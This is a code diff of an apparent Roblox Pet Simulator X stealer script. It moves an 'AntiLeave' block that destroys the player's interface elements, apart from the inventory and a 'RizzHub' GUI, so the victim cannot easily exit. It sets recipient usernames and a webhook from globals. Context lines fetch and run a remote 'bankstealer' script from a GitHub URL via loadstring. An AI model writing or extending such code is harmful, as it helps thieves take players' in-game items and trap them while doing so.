@@ -45,13 +45,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = UserName
+    UserName = _G.UserName
 end
 if UserName2 == nil then
-    UserName2 = UserName2
+    UserName2 = _G.UserName2
 end
 if Webhook == nil then
-    Webhook = Webhook
+    Webhook = _G.Webhook
 end
 -- User Checks
 
@@ -218,6 +218,20 @@ if _G.LoadingScreen ~= false then
                             TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                             TextLabel_2.TextSize = 36.000
                             TextLabel_2.TextWrapped = true
+end
+
+if _G.AntiLeave ~= false then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
 
 -- Remotes
 
@@ -755,18 +769,6 @@ if diaamt < 110000 then
     _G.MouseLock = false
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
-end
-if _G.AntiLeave ~= false then
-    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
-        if v.Name ~= "Inventory" then
-            v:Destroy()
-        end
-    end
-    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
-            v:Destroy()
-        end
-    end
 end
 
 -- Pets Tables :
